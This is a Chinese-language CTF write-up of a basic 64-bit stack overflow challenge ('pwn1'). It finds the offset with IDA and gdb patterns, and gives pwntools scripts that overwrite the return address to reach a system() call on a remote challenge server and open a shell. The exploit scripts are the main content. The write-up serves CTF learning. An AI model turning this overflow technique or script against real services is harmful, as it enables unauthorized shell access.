# Pwn基础溢出练习

又一个PWN1，先看看安全保护机制

![image-20210616090448865](Pwn基础溢出练习.assets/image-20210616090448865.png)

看看main()

![image-20210616090426195](Pwn基础溢出练习.assets/image-20210616090426195.png)

看看shift+F12字符串

![image-20210616090613289](Pwn基础溢出练习.assets/image-20210616090613289.png)

利用get()溢出到system()，system()上通过Ctrl+E找到地址401040

![image-20210616093513516](Pwn基础溢出练习.assets/image-20210616093513516.png)

双击s字符串，发现溢出长度应为15字节+8字节（db 8 dup(?)），即偏移量23

![image-20210616091621519](Pwn基础溢出练习.assets/image-20210616091621519.png)

db： 定义字节类型变量的伪指令


dup()： 重复定义圆括号中指定的初值，次数由前面的数值决定


?： 只分配存储空间，不指定初值





![image-20210616091911280](Pwn基础溢出练习.assets/image-20210616091911280.png)

开gdb调试```gdb pwn1```

生成溢出字符串```pattern create 200```

`AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA`

启动程序`start`

步进`contin `并输入溢出字符串获得溢出调试

![image-20210616092440447](Pwn基础溢出练习.assets/image-20210616092440447.png)

`pattern offset  (这里粘贴栈底或者rbp的字符串)`

![image-20210616092906718](Pwn基础溢出练习.assets/image-20210616092906718.png)

wc，偏移长度怎么是24？？？

不管了，python脚本一把梭试试看（堆栈平衡要+1）

```python
from pwn import *

p = remote('118.190.151.140',60001)
payload = b'a' * 24 + p64(0x401040 + 1)
p.sendline(payload)

p.interactive()
```

果不其然，翻车了

![image-20210616093826456](Pwn基础溢出练习.assets/image-20210616093826456.png)



仔细检查一下，发现引入函数的地址不对应该是0x401142

![image-20210616095956066](Pwn基础溢出练习.assets/image-20210616095956066.png)

```python
from pwn import *

p = remote('118.190.151.140',60001)
payload = b'a' * 24 + p64(0x401142 + 1)
p.sendline(payload)

p.interactive()
```

成功获得Shell

![image-20210616144418465](Pwn基础溢出练习.assets/image-20210616144418465.png)